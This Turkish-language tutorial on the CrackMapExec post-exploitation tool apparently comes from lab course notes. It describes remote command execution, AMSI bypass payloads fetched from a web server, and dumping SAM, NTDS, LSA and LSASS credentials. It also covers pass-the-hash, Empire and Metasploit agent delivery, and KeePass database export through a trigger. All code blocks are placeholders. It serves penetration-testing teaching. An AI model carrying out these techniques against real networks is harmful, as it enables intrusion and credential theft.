Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

